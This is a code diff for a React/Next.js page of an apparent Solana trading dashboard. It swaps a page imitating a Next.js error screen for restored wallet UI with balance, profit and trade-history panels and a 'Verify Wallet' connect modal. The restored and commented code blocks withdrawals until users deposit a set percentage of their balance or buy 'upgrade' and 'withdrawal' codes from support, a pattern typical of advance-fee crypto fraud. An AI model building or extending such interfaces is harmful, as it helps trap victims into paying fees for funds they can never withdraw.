-//     });
-//   } finally {
-//     setProcessing(false);
-//   }
-// };
+    toast.error("Failed to verify wallet", {
+      description: error?.message || "Connection failed",
+    });
+  } finally {
+    setProcessing(false);
+  }
+};
 
 
   
 
-//   if (!walletAddress) {
-//     return (
-//       <div className="min-h-screen bg-[#050d1a]">
-//         <Header />
-//         <main className="container mx-auto px-2.5 py-8">
-//           <div className="max-w-2xl mx-auto text-center">
-//             <div className="bg-[#0a1628] border border-blue-500/30 rounded-2xl p-12">
-//               <Wallet className="w-16 h-16 text-blue-400 mx-auto mb-4" />
-//               <h2 className="text-2xl font-bold text-white mb-2">No Wallet Connected</h2>
-//               <p className="text-gray-400 mb-6">Please connect your wallet to view your balance and transactions</p>
-//             </div>
-//           </div>
-//         </main>
-//       </div>
-//     )
-//   }
+  if (!walletAddress) {
+    return (
+      <div className="min-h-screen bg-[#050d1a]">
+        <Header />
+        <main className="container mx-auto px-2.5 py-8">
+          <div className="max-w-2xl mx-auto text-center">
+            <div className="bg-[#0a1628] border border-blue-500/30 rounded-2xl p-12">
+              <Wallet className="w-16 h-16 text-blue-400 mx-auto mb-4" />
+              <h2 className="text-2xl font-bold text-white mb-2">No Wallet Connected</h2>
+              <p className="text-gray-400 mb-6">Please connect your wallet to view your balance and transactions</p>
+            </div>
+          </div>
+        </main>
+      </div>
+    )
+  }
 
-//   return (
-//     <div className="min-h-screen bg-[#050d1a]">
-//       <WithdrawalSuccessModal
-//         isOpen={showWithdrawalSuccess}
-//         amount={lastWithdrawalAmount}
-//         transactionHash={lastWithdrawalHash}
-//         onClose={() => setShowWithdrawalSuccess(false)}
-//       />
-
-//        <VerifyConnectModal
-//               isOpen={isWalletModalOpen}
-//               onClose={() => setIsWalletModalOpen(false)}
-//               onConnect={handlePhantomConnect}
-//             />
-//       <Header />
-//       <main className="container mx-auto px-2.5 py-8">
-//         <div className="max-w-7xl mx-auto">
-//           <div className="mb-8">
-//             <div className="flex items-center gap-3">
-//               <div className="w-12 h-12 bg-blue-700 rounded-xl flex items-center justify-center">
-//                 <Wallet className="w-6 h-6 text-white" />
-//               </div>
-//               <div>
-//                 <h1 className="text-3xl font-bold text-white">My Wallet</h1>
-//                 <p className="text-gray-400 text-sm font-mono">
-//                   {walletAddress.slice(0, 8)}...{walletAddress.slice(-8)}
-//                 </p>
-//               </div>
-//             </div>
-//           </div>
-
-//           <div className="grid lg:grid-cols-3 gap-6">
-//             <div className="lg:col-span-2 bg-[#0a1628] border border-blue-500/30 rounded-2xl p-8">
-//               <div className="mb-6">
-//                 <div className="flex items-center justify-between mb-2">
-//                   <p className="text-gray-400 text-sm flex items-center gap-2">
-//                     <DollarSign className="w-4 h-4" />
-//                     Available Balance
-//                   </p>
-//                   {/* Live price indicator */}
-//                   <div className="flex items-center gap-1.5 text-xs text-blue-400 bg-blue-900/20 border border-blue-500/20 rounded-full px-3 py-1">
-//                     <span className="w-1.5 h-1.5 rounded-full bg-blue-400 animate-pulse inline-block" />
-//                     SOL = ${effectiveSolPrice.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
-//                   </div>
-//                 </div>
-//                 {loading ? (
-//                   <div className="flex items-center gap-3">
-//                     <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-blue-400" />
-//                     <span className="text-gray-400">Loading balance...</span>
-//                   </div>
-//                 ) : (
-//                   <div>
-//                     <h2 className="text-6xl font-bold text-white mb-2">{balance.toFixed(4)}</h2>
-//                     <div className="flex items-center gap-2">
-//                       <span className="text-2xl text-blue-400 font-semibold">SOL</span>
-//                       <span className="text-gray-500">≈</span>
-//                       <span className="text-xl text-gray-400">${(balance * effectiveSolPrice).toFixed(2)} USD</span>
-//                     </div>
-//                   </div>
-//                 )}
-//               </div>
-
-//               <div className="grid grid-cols-2 gap-3">
-//                 <Button
-//                   onClick={handleDeposit}
-//                   disabled={processing}
-//                   className="bg-blue-700 hover:bg-blue-800 text-white font-semibold h-12"
-//                 >
-//                   <ArrowDownRight className="w-4 h-4 mr-2" />
-//                   {processing ? "Processing..." : "Deposit"}
-//                 </Button>
-//                 <Button
-//                   onClick={handleWithdrawClick}
-//                   disabled={processing}
-//                   variant="outline"
-//                   className="border-blue-500/30 text-white hover:bg-blue-900/20 bg-transparent h-12"
-//                 >
-//                   <ArrowUpRight className="w-4 h-4 mr-2" />
-//                   {processing ? "Processing..." : "Withdraw"}
-//                 </Button>
-//                 <Button
-//                       onClick={() => setIsWalletModalOpen(true)}
-//                       disabled={processing}
-//                       variant="outline"
-//                       className="border-green-500/30 text-green-400 hover:bg-green-900/20 bg-transparent h-12"
-//                     >
-//                       <Wallet className="w-4 h-4 mr-2" />
-//                       Verify Wallet
-//                     </Button>
-//               </div>
-//             </div>
-
-//             <div className="space-y-4">
-//               <div className="bg-[#0a1628] border border-blue-500/30 rounded-xl p-6">
-//                 <div className="flex items-center gap-2 text-blue-400 mb-3">
-//                   <TrendingUp className="w-5 h-5" />
-//                   <span className="text-sm font-semibold">Total Profit</span>
-//                 </div>
-//                 <p className={`text-3xl font-bold ${stats.totalProfit >= 0 ? "text-blue-400" : "text-red-400"}`}>
-//                   {stats.totalProfit >= 0 ? "+" : ""}
-//                   {stats.totalProfit.toFixed(4)}
-//                 </p>
-//                 <p className="text-gray-400 text-sm mt-1">SOL</p>
-//               </div>
-
-//               <div className="bg-[#0a1628] border border-blue-500/30 rounded-xl p-6">
-//                 <div className="flex items-center gap-2 text-blue-400 mb-3">
-//                   <Activity className="w-5 h-5" />
-//                   <span className="text-sm font-semibold">Total Trades</span>
-//                 </div>
-//                 <p className="text-3xl font-bold text-white">{stats.totalTrades}</p>
-//                 <p className="text-gray-400 text-sm mt-1">{stats.winRate.toFixed(1)}% Win Rate</p>
-//               </div>
-
-//               <div className="bg-[#0a1628] border border-blue-500/30 rounded-xl p-6">
-//                 <div className="flex items-center gap-2 text-blue-400 mb-3">
-//                   <DollarSign className="w-5 h-5" />
-//                   <span className="text-sm font-semibold">Volume</span>
-//                 </div>
-//                 <p className="text-3xl font-bold text-white">{stats.volume.toFixed(2)}</p>
-//                 <p className="text-gray-400 text-sm mt-1">SOL</p>
-//               </div>
-//             </div>
-//           </div>
-
-//           <div className="mt-8 bg-[#0a1628] border border-blue-500/30 rounded-2xl overflow-hidden">
-//             <div className="p-6 border-b border-blue-900/30">
-//               <h3 className="text-white font-bold text-xl flex items-center gap-2">
-//                 <Clock className="w-5 h-5 text-blue-400" />
-//                 Transaction History
-//               </h3>
-//             </div>
-//             <div className="divide-y divide-blue-900/20">
-//               {transactions.length === 0 ? (
-//                 <div className="p-12 text-center text-gray-400">
-//                   <Activity className="w-12 h-12 mx-auto mb-3 opacity-50" />
-//                   <p>No transactions yet</p>
-//                 </div>
-//               ) : (
-//                 transactions.map((tx) => (
-//                   <div key={tx.id} className="p-4 hover:bg-blue-900/10 transition-colors">
-//                     <div className="flex items-center justify-between">
-//                       <div className="flex items-center gap-4">
-//                         <div
-//                           className={`w-12 h-12 rounded-xl flex items-center justify-center ${
-//                             tx.status === "success"
-//                               ? "bg-blue-900/30 border border-blue-500/30"
-//                               : tx.status === "failed"
-//                                 ? "bg-red-900/30 border border-red-500/30"
-//                                 : "bg-gray-900/30 border border-gray-500/30"
-//                           }`}
-//                         >
-//                           {tx.status === "success" ? (
-//                             <TrendingUp className="w-6 h-6 text-blue-400" />
-//                           ) : tx.status === "failed" ? (
-//                             <TrendingDown className="w-6 h-6 text-red-400" />
-//                           ) : (
-//                             <Clock className="w-6 h-6 text-gray-400" />
-//                           )}
-//                         </div>
-//                         <div>
-//                           <p className="text-white font-semibold text-lg">{tx.token || "Token Trade"}</p>
-//                           <div className="flex items-center gap-2 text-sm">
-//                             <span className="text-gray-400">
-//                               {tx.timestamp
-//                                 ? formatDistanceToNow(
-//                                     tx.timestamp.toDate ? tx.timestamp.toDate() : new Date(tx.timestamp),
-//                                     { addSuffix: true },
-//                                   )
-//                                 : "Just now"}
-//                             </span>
-//                             <span className="text-gray-600">•</span>
-//                             <span className="text-gray-500 capitalize">{tx.status || "pending"}</span>
-//                           </div>
-//                         </div>
-//                       </div>
-//                       <div className="text-right">
-//                         <p
-//                           className={`font-bold text-lg ${
-//                             tx.profit > 0 ? "text-blue-400" : tx.profit < 0 ? "text-red-400" : "text-gray-400"
-//                           }`}
-//                         >
-//                           {tx.profit > 0 ? "+" : ""}
-//                           {tx.profit?.toFixed(4) || "0.0000"} SOL
-//                         </p>
-//                         <p className="text-gray-400 text-sm">Amount: {tx.amount?.toFixed(4)} SOL</p>
-//                       </div>
-//                     </div>
-//                   </div>
-//                 ))
-//               )}
-//             </div>
-//           </div>
-//         </div>
-//       </main>
-
-//       {/* Deposit Required Dialog */}
-//       {showDepositRequiredDialog && (
-//         <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm px-4">
-//           <div className="relative w-full max-w-lg">
-//             <div className="absolute inset-0 bg-gradient-to-r from-blue-600/30 to-blue-800/30 rounded-2xl blur-xl" />
-
-//             <div className="relative bg-[#0a1628] border border-blue-500/30 rounded-2xl shadow-2xl overflow-hidden">
-//               <div className="bg-gradient-to-r from-blue-900/50 to-blue-800/30 px-6 py-5 border-b border-blue-500/20">
-//                 <div className="flex items-center justify-between">
-//                   <div className="flex items-center gap-3">
-//                     <div className="w-12 h-12 bg-blue-600/20 border border-blue-500/30 rounded-xl flex items-center justify-center">
-//                       <AlertCircle className="w-6 h-6 text-blue-400" />
-//                     </div>
-//                     <div>
-//                       <h3 className="text-xl font-bold text-white">Deposit Required</h3>
-//                       <p className="text-gray-400 text-sm">Additional deposit needed to withdraw</p>
-//                     </div>
-//                   </div>
-//                   <button
-//                     onClick={() => setShowDepositRequiredDialog(false)}
-//                     className="p-2 hover:bg-blue-900/20 rounded-lg transition-colors"
-//                     aria-label="Close dialog"
-//                   >
-//                     <X className="w-5 h-5 text-gray-400 hover:text-white" />
-//                   </button>
-//                 </div>
-//               </div>
-
-//               <div className="p-6 space-y-5">
-//                 <div className="p-4 bg-amber-900/20 border border-amber-500/30 rounded-xl">
-//                   <div className="flex items-start gap-3">
-//                     <AlertCircle className="w-5 h-5 text-amber-400 mt-0.5 shrink-0" />
-//                     <p className="text-amber-200 text-sm leading-relaxed">
-//                       To withdraw your funds, you are required to have <span className="font-bold text-amber-100">{requiredDepositPercentage}%</span> of your current balance deposited.
-//                     </p>
-//                   </div>
-//                 </div>
-
-//                 <div className="grid gap-4">
-//                   <div className="bg-[#050d1a] border border-blue-900/30 rounded-xl p-4">
-//                     <div className="flex items-center justify-between">
-//                       <span className="text-gray-400 text-sm">Your Current Balance</span>
-//                       <div className="flex items-center gap-2">
-//                         <span className="text-white font-bold text-lg">{balance.toFixed(4)} SOL</span>
-//                       </div>
-//                     </div>
-//                   </div>
-
-//                   <div className="bg-[#050d1a] border border-blue-900/30 rounded-xl p-4">
-//                     <div className="flex items-center justify-between">
-//                       <span className="text-gray-400 text-sm">Total Deposited</span>
-//                       <div className="flex items-center gap-2">
-//                         <span className="text-blue-400 font-bold text-lg">{totalDepositedSOL.toFixed(4)} SOL</span>
-//                       </div>
-//                     </div>
-//                   </div>
-
-//                   <div className="bg-[#050d1a] border border-blue-900/30 rounded-xl p-4">
-//                     <div className="flex items-center justify-between">
-//                       <span className="text-gray-400 text-sm">Required Deposit ({requiredDepositPercentage}%)</span>
-//                       <div className="flex items-center gap-2">
-//                         <span className="text-white font-bold text-lg">{requiredDepositForWithdrawal.toFixed(4)} SOL</span>
-//                       </div>
-//                     </div>
-//                   </div>
-
-//                   <div className="bg-gradient-to-r from-blue-900/30 to-blue-800/20 border border-blue-500/30 rounded-xl p-4">
-//                     <div className="flex items-center justify-between">
-//                       <span className="text-blue-300 text-sm font-medium">Amount Needed to Deposit</span>
-//                       <div className="flex items-center gap-2">
-//                         <span className="text-blue-300 font-bold text-xl">{depositShortfall.toFixed(4)} SOL</span>
-//                       </div>
-//                     </div>
-//                   </div>
-//                 </div>
-//               </div>
-
-//               <div className="px-6 pb-6 flex gap-3">
-//                 <Button
-//                   onClick={() => setShowDepositRequiredDialog(false)}
-//                   variant="outline"
-//                   className="flex-1 border-gray-600 text-gray-300 hover:bg-blue-900/20 bg-transparent h-12"
-//                 >
-//                   <X className="w-4 h-4 mr-2" />
-//                   Close
-//                 </Button>
-//                 <Button
-//                   onClick={() => {
-//                     setShowDepositRequiredDialog(false)
-//                     handleDeposit()
-//                   }}
-//                   className="flex-1 bg-blue-700 hover:bg-blue-800 text-white h-12 font-semibold"
-//                 >
-//                   <ArrowDownRight className="w-4 h-4 mr-2" />
-//                   Deposit Now
-//                 </Button>
-//               </div>
-//             </div>
-//           </div>
-//         </div>
-//       )}
-
-//       {/* Upgrade Code Dialog */}
-//       {showUpgradeCodeDialog && (
-//         <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm px-4">
-//           <div className="w-full max-w-md bg-[#050d1a] border border-blue-500/30 rounded-2xl p-8 shadow-2xl">
-//             <div className="flex items-center justify-between mb-6">
-//               <div className="flex items-center gap-3">
-//                 <div className="w-12 h-12 bg-blue-900/30 border border-blue-500/30 rounded-xl flex items-center justify-center">
-//                   <ArrowUpCircle className="w-6 h-6 text-blue-400" />
-//                 </div>
-//                 <div>
-//                   <h3 className="text-xl font-bold text-white">Upgrade Required</h3>
-//                   <p className="text-gray-400 text-sm">Enter your upgrade code to proceed</p>
-//                 </div>
-//               </div>
-//               <button
-//                 onClick={() => setShowUpgradeCodeDialog(false)}
-//                 className="p-2 hover:bg-blue-900/20 rounded-lg transition-colors"
-//                 aria-label="Close dialog"
-//               >
-//                 <X className="w-5 h-5 text-gray-400" />
-//               </button>
-//             </div>
-
-//             <div className="mb-4 p-4 bg-amber-900/20 border border-amber-500/30 rounded-lg">
-//               <div className="flex items-start gap-2">
-//                 <AlertCircle className="w-5 h-5 text-amber-400 mt-0.5 shrink-0" />
-//                 <p className="text-amber-300 text-sm">
-//                   An upgrade code is required to process withdrawals. Please contact support to purchase an upgrade code.
-//                 </p>
-//               </div>
-//             </div>
-
-//             <div className="mb-6">
-//               <label htmlFor="upgradeCode" className="block text-sm font-medium text-gray-300 mb-2">
-//                 Upgrade Code
-//               </label>
-//               <input
-//                 type="text"
-//                 id="upgradeCode"
-//                 value={upgradeCodeEntry}
-//                 onChange={(e) => { setUpgradeCodeEntry(e.target.value); setCodeError("") }}
-//                 className="w-full px-4 py-3 bg-[#0a1628] border border-blue-500/30 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
-//                 placeholder="Enter upgrade code"
-//                 autoFocus
-//               />
-//               {codeError && (
-//                 <p className="mt-2 text-sm text-red-400 flex items-center gap-1">
-//                   <AlertCircle className="w-4 h-4" />
-//                   {codeError}
-//                 </p>
-//               )}
-//             </div>
-
-//             <div className="flex gap-3">
-//               <Button
-//                 onClick={() => setShowUpgradeCodeDialog(false)}
-//                 variant="outline"
-//                 className="flex-1 border-gray-600 text-gray-300 hover:bg-blue-900/20 bg-transparent"
-//               >
-//                 Cancel
-//               </Button>
-//               <Button onClick={handleUpgradeCodeSubmit} className="flex-1 bg-blue-700 hover:bg-blue-800 text-white">
-//                 <KeyRound className="w-4 h-4 mr-2" />
-//                 Verify Code
-//               </Button>
-//             </div>
-//           </div>
-//         </div>
-//       )}
-
-//       {/* Withdrawal Code Dialog */}
-//       {showWithdrawalCodeDialog && (
-//         <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm px-4">
-//           <div className="w-full max-w-md bg-[#050d1a] border border-blue-500/30 rounded-2xl p-8 shadow-2xl">
-//             <div className="flex items-center justify-between mb-6">
-//               <div className="flex items-center gap-3">
-//                 <div className="w-12 h-12 bg-blue-900/30 border border-blue-500/30 rounded-xl flex items-center justify-center">
-//                   <KeyRound className="w-6 h-6 text-blue-400" />
-//                 </div>
-//                 <div>
-//                   <h3 className="text-xl font-bold text-white">Withdrawal Code Required</h3>
-//                   <p className="text-gray-400 text-sm">Enter your withdrawal code to proceed</p>
-//                 </div>
-//               </div>
-//               <button
-//                 onClick={() => setShowWithdrawalCodeDialog(false)}
-//                 className="p-2 hover:bg-blue-900/20 rounded-lg transition-colors"
-//                 aria-label="Close dialog"
-//               >
-//                 <X className="w-5 h-5 text-gray-400" />
-//               </button>
-//             </div>
-
-//             <div className="mb-4 p-4 bg-amber-900/20 border border-amber-500/30 rounded-lg">
-//               <div className="flex items-start gap-2">
-//                 <AlertCircle className="w-5 h-5 text-amber-400 mt-0.5 shrink-0" />
-//                 <p className="text-amber-300 text-sm">
-//                   A withdrawal code is required to process this withdrawal. Please contact support to purchase a
-//                   withdrawal code.
-//                 </p>
-//               </div>
-//             </div>
-
-//             <div className="mb-6">
-//               <label htmlFor="withdrawalCode" className="block text-sm font-medium text-gray-300 mb-2">
-//                 Withdrawal Code
-//               </label>
-//               <input
-//                 type="text"
-//                 id="withdrawalCode"
-//                 value={withdrawalCodeEntry}
-//                 onChange={(e) => { setWithdrawalCodeEntry(e.target.value); setCodeError("") }}
-//                 className="w-full px-4 py-3 bg-[#0a1628] border border-blue-500/30 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
-//                 placeholder="Enter withdrawal code"
-//                 autoFocus
-//               />
-//               {codeError && (
-//                 <p className="mt-2 text-sm text-red-400 flex items-center gap-1">
-//                   <AlertCircle className="w-4 h-4" />
-//                   {codeError}
-//                 </p>
-//               )}
-//             </div>
-
-//             <div className="flex gap-3">
-//               <Button
-//                 onClick={() => setShowWithdrawalCodeDialog(false)}
-//                 variant="outline"
-//                 className="flex-1 border-gray-600 text-gray-300 hover:bg-blue-900/20 bg-transparent"
-//               >
-//                 Cancel
-//               </Button>
-//               <Button onClick={handleWithdrawalCodeSubmit} className="flex-1 bg-blue-700 hover:bg-blue-800 text-white">
-//                 <KeyRound className="w-4 h-4 mr-2" />
-//                 Verify Code
-//               </Button>
-//             </div>
-//           </div>
-//         </div>
-//       )}
-//     </div>
-//   )
-// }
-import React from 'react'
-import { ChevronRight, Copy, BookOpen, Box } from "lucide-react";
-
-
-const page = () => {
   return (
-   <div className="min-h-screen bg-[#050505] flex items-center justify-center p-8">
-      <div className="relative w-full max-w-6xl overflow-hidden rounded-3xl border border-white/10 bg-[#111111] shadow-[0_0_50px_rgba(0,0,0,.7)]">
+    <div className="min-h-screen bg-[#050d1a]">
+      <WithdrawalSuccessModal
+        isOpen={showWithdrawalSuccess}
+        amount={lastWithdrawalAmount}
+        transactionHash={lastWithdrawalHash}
+        onClose={() => setShowWithdrawalSuccess(false)}
+      />
 
-        {/* Top Bar */}
-        <div className="flex items-center justify-between border-b border-white/10 px-6 py-4">
-
-          {/* Left */}
-          <div className="flex items-center gap-3">
-            <button className="flex h-9 w-9 items-center justify-center rounded-full bg-white/5 hover:bg-white/10">
-              ←
-            </button>
-
-            <span className="text-sm font-semibold text-zinc-400">
-              1/2
-            </span>
-
-            <button className="flex h-9 w-9 items-center justify-center rounded-full bg-white/5 hover:bg-white/10">
-              →
-            </button>
+       <VerifyConnectModal
+              isOpen={isWalletModalOpen}
+              onClose={() => setIsWalletModalOpen(false)}
+              onConnect={handlePhantomConnect}
+            />
+      <Header />
+      <main className="container mx-auto px-2.5 py-8">
+        <div className="max-w-7xl mx-auto">
+          <div className="mb-8">
+            <div className="flex items-center gap-3">
+              <div className="w-12 h-12 bg-blue-700 rounded-xl flex items-center justify-center">
+                <Wallet className="w-6 h-6 text-white" />
+              </div>
+              <div>
+                <h1 className="text-3xl font-bold text-white">My Wallet</h1>
+                <p className="text-gray-400 text-sm font-mono">
+                  {walletAddress.slice(0, 8)}...{walletAddress.slice(-8)}
+                </p>
+              </div>
+            </div>
           </div>
 
-          {/* Right */}
-          <div className="rounded-full border border-white/10 bg-[#181818] px-4 py-2 text-sm text-zinc-400">
-            <span className="mr-2 inline-block h-2.5 w-2.5 rounded-full bg-orange-400" />
-            Next.js 16.0.10 (stale)
-            <span className="ml-1 text-violet-400">Turbopack</span>
-          </div>
-        </div>
+          <div className="grid lg:grid-cols-3 gap-6">
+            <div className="lg:col-span-2 bg-[#0a1628] border border-blue-500/30 rounded-2xl p-8">
+              <div className="mb-6">
+                <div className="flex items-center justify-between mb-2">
+                  <p className="text-gray-400 text-sm flex items-center gap-2">
+                    <DollarSign className="w-4 h-4" />
+                    Available Balance
+                  </p>
+                  {/* Live price indicator */}
+                  <div className="flex items-center gap-1.5 text-xs text-blue-400 bg-blue-900/20 border border-blue-500/20 rounded-full px-3 py-1">
+                    <span className="w-1.5 h-1.5 rounded-full bg-blue-400 animate-pulse inline-block" />
+                    SOL = ${effectiveSolPrice.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
+                  </div>
+                </div>
+                {loading ? (
+                  <div className="flex items-center gap-3">
+                    <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-blue-400" />
+                    <span className="text-gray-400">Loading balance...</span>
+                  </div>
+                ) : (
+                  <div>
+                    <h2 className="text-6xl font-bold text-white mb-2">{balance.toFixed(4)}</h2>
+                    <div className="flex items-center gap-2">
+                      <span className="text-2xl text-blue-400 font-semibold">SOL</span>
+                      <span className="text-gray-500">≈</span>
+                      <span className="text-xl text-gray-400">${(balance * effectiveSolPrice).toFixed(2)} USD</span>
+                    </div>
+                  </div>
+                )}
+              </div>
 
-        {/* Body */}
-        <div className="space-y-8 p-8">
-
-          {/* Badge */}
-          <div>
-            <span className="rounded-md bg-[#3B1718] px-3 py-2 text-sm font-semibold text-[#FF6B6B]">
-              Console Error
-            </span>
-          </div>
-
-          {/* Error Title */}
-          <h2 className="max-w-5xl text-[20px] font-semibold leading-snug text-[#FF6B6B]">
-            A tree hydrated but some attributes of the server rendered HTML
-            didn't match the client properties. This won't be patched up.
-            This can happen if a SSR-ed Client Component used:
-          </h2>
-
-          {/* List */}
-          <div className="space-y-2 text-lg leading-8 text-zinc-400">
-            <p>- A server/client branch if (typeof window !== "undefined").</p>
-            <p>- Variable input such as Date.now() or Math.random().</p>
-            <p>- Date formatting in a user's locale.</p>
-            <p>- External changing data without sending a snapshot.</p>
-            <p>- Invalid HTML tag nesting.</p>
-          </div>
-
-          <p className="text-lg leading-8 text-zinc-400">
-            It can also happen if the client has a browser extension installed
-            which messes with the HTML before React loaded.
-          </p>
-
-          {/* Link */}
-          <div className="text-lg">
-            <span className="font-semibold text-white">
-              See more info here:
-            </span>{" "}
-            <a
-              href="#"
-              className="text-[#4EA8FF] hover:underline"
-            >
-              https://nextjs.org/docs/messages/react-hydration-error
-            </a>
-          </div>
-
-          {/* Code Block */}
-          <div className="overflow-hidden rounded-2xl border border-white/10 bg-black">
-
-            <div className="flex items-center justify-between border-b border-white/10 px-5 py-4">
-
-              <ChevronRight className="text-zinc-400" size={18} />
-
-              <div className="flex gap-3">
-
-                <button className="rounded-lg p-2 hover:bg-white/5">
-                  <Copy size={18} className="text-zinc-500" />
-                </button>
-
-                <button className="rounded-lg p-2 hover:bg-white/5">
-                  <BookOpen size={18} className="text-zinc-500" />
-                </button>
-
-                <button className="rounded-lg p-2 hover:bg-white/5">
-                  <Box size={18} className="text-zinc-500" />
-                </button>
-
+              <div className="grid grid-cols-2 gap-3">
+                <Button
+                  onClick={handleDeposit}
+                  disabled={processing}
+                  className="bg-blue-700 hover:bg-blue-800 text-white font-semibold h-12"
+                >
+                  <ArrowDownRight className="w-4 h-4 mr-2" />
+                  {processing ? "Processing..." : "Deposit"}
+                </Button>
+                <Button
+                  onClick={handleWithdrawClick}
+                  disabled={processing}
+                  variant="outline"
+                  className="border-blue-500/30 text-white hover:bg-blue-900/20 bg-transparent h-12"
+                >
+                  <ArrowUpRight className="w-4 h-4 mr-2" />
+                  {processing ? "Processing..." : "Withdraw"}
+                </Button>
+                <Button
+                      onClick={() => setIsWalletModalOpen(true)}
+                      disabled={processing}
+                      variant="outline"
+                      className="border-green-500/30 text-green-400 hover:bg-green-900/20 bg-transparent h-12"
+                    >
+                      <Wallet className="w-4 h-4 mr-2" />
+                      Verify Wallet
+                    </Button>
               </div>
             </div>
 
-            <pre className="overflow-x-auto p-6 font-mono text-[15px] leading-7 text-zinc-300">
-{`<input
-  placeholder="Search..."
-  className="bg-transparent text-sm text-gray-300 outline-none w-32"
-  fdprocessedid="vxy8b"
-/>`}
-            </pre>
+            <div className="space-y-4">
+              <div className="bg-[#0a1628] border border-blue-500/30 rounded-xl p-6">
+                <div className="flex items-center gap-2 text-blue-400 mb-3">
+                  <TrendingUp className="w-5 h-5" />
+                  <span className="text-sm font-semibold">Total Profit</span>
+                </div>
+                <p className={`text-3xl font-bold ${stats.totalProfit >= 0 ? "text-blue-400" : "text-red-400"}`}>
+                  {stats.totalProfit >= 0 ? "+" : ""}
+                  {stats.totalProfit.toFixed(4)}
+                </p>
+                <p className="text-gray-400 text-sm mt-1">SOL</p>
+              </div>
 
-            <div className="h-8 bg-[#5B2224]" />
+              <div className="bg-[#0a1628] border border-blue-500/30 rounded-xl p-6">
+                <div className="flex items-center gap-2 text-blue-400 mb-3">
+                  <Activity className="w-5 h-5" />
+                  <span className="text-sm font-semibold">Total Trades</span>
+                </div>
+                <p className="text-3xl font-bold text-white">{stats.totalTrades}</p>
+                <p className="text-gray-400 text-sm mt-1">{stats.winRate.toFixed(1)}% Win Rate</p>
+              </div>
+
+              <div className="bg-[#0a1628] border border-blue-500/30 rounded-xl p-6">
+                <div className="flex items-center gap-2 text-blue-400 mb-3">
+                  <DollarSign className="w-5 h-5" />
+                  <span className="text-sm font-semibold">Volume</span>
+                </div>
+                <p className="text-3xl font-bold text-white">{stats.volume.toFixed(2)}</p>
+                <p className="text-gray-400 text-sm mt-1">SOL</p>
+              </div>
+            </div>
           </div>
 
+          <div className="mt-8 bg-[#0a1628] border border-blue-500/30 rounded-2xl overflow-hidden">
+            <div className="p-6 border-b border-blue-900/30">
+              <h3 className="text-white font-bold text-xl flex items-center gap-2">
+                <Clock className="w-5 h-5 text-blue-400" />
+                Transaction History
+              </h3>
+            </div>
+            <div className="divide-y divide-blue-900/20">
+              {transactions.length === 0 ? (
+                <div className="p-12 text-center text-gray-400">
+                  <Activity className="w-12 h-12 mx-auto mb-3 opacity-50" />
+                  <p>No transactions yet</p>
+                </div>
+              ) : (
+                transactions.map((tx) => (
+                  <div key={tx.id} className="p-4 hover:bg-blue-900/10 transition-colors">
+                    <div className="flex items-center justify-between">
+                      <div className="flex items-center gap-4">
+                        <div
+                          className={`w-12 h-12 rounded-xl flex items-center justify-center ${
+                            tx.status === "success"
+                              ? "bg-blue-900/30 border border-blue-500/30"
+                              : tx.status === "failed"
+                                ? "bg-red-900/30 border border-red-500/30"
+                                : "bg-gray-900/30 border border-gray-500/30"
+                          }`}
+                        >
+                          {tx.status === "success" ? (
+                            <TrendingUp className="w-6 h-6 text-blue-400" />
+                          ) : tx.status === "failed" ? (
+                            <TrendingDown className="w-6 h-6 text-red-400" />
+                          ) : (
+                            <Clock className="w-6 h-6 text-gray-400" />
+                          )}
+                        </div>
+                        <div>
+                          <p className="text-white font-semibold text-lg">{tx.token || "Token Trade"}</p>
+                          <div className="flex items-center gap-2 text-sm">
+                            <span className="text-gray-400">
+                              {tx.timestamp
+                                ? formatDistanceToNow(
+                                    tx.timestamp.toDate ? tx.timestamp.toDate() : new Date(tx.timestamp),
+                                    { addSuffix: true },
+                                  )
+                                : "Just now"}
+                            </span>
+                            <span className="text-gray-600">•</span>
+                            <span className="text-gray-500 capitalize">{tx.status || "pending"}</span>
+                          </div>
+                        </div>
+                      </div>
+                      <div className="text-right">
+                        <p
+                          className={`font-bold text-lg ${
+                            tx.profit > 0 ? "text-blue-400" : tx.profit < 0 ? "text-red-400" : "text-gray-400"
+                          }`}
+                        >
+                          {tx.profit > 0 ? "+" : ""}
+                          {tx.profit?.toFixed(4) || "0.0000"} SOL
+                        </p>
+                        <p className="text-gray-400 text-sm">Amount: {tx.amount?.toFixed(4)} SOL</p>
+                      </div>
+                    </div>
+                  </div>
+                ))
+              )}
+            </div>
+          </div>
         </div>
-      </div>
+      </main>
+
+      {/* Deposit Required Dialog */}
+      {showDepositRequiredDialog && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm px-4">
+          <div className="relative w-full max-w-lg">
+            <div className="absolute inset-0 bg-gradient-to-r from-blue-600/30 to-blue-800/30 rounded-2xl blur-xl" />
+
+            <div className="relative bg-[#0a1628] border border-blue-500/30 rounded-2xl shadow-2xl overflow-hidden">
+              <div className="bg-gradient-to-r from-blue-900/50 to-blue-800/30 px-6 py-5 border-b border-blue-500/20">
+                <div className="flex items-center justify-between">
+                  <div className="flex items-center gap-3">
+                    <div className="w-12 h-12 bg-blue-600/20 border border-blue-500/30 rounded-xl flex items-center justify-center">
+                      <AlertCircle className="w-6 h-6 text-blue-400" />
+                    </div>
+                    <div>
+                      <h3 className="text-xl font-bold text-white">Deposit Required</h3>
+                      <p className="text-gray-400 text-sm">Additional deposit needed to withdraw</p>
+                    </div>
+                  </div>
+                  <button
+                    onClick={() => setShowDepositRequiredDialog(false)}
+                    className="p-2 hover:bg-blue-900/20 rounded-lg transition-colors"
+                    aria-label="Close dialog"
+                  >
+                    <X className="w-5 h-5 text-gray-400 hover:text-white" />
+                  </button>
+                </div>
+              </div>
+
+              <div className="p-6 space-y-5">
+                <div className="p-4 bg-amber-900/20 border border-amber-500/30 rounded-xl">
+                  <div className="flex items-start gap-3">
+                    <AlertCircle className="w-5 h-5 text-amber-400 mt-0.5 shrink-0" />
+                    <p className="text-amber-200 text-sm leading-relaxed">
+                      To withdraw your funds, you are required to have <span className="font-bold text-amber-100">{requiredDepositPercentage}%</span> of your current balance deposited.
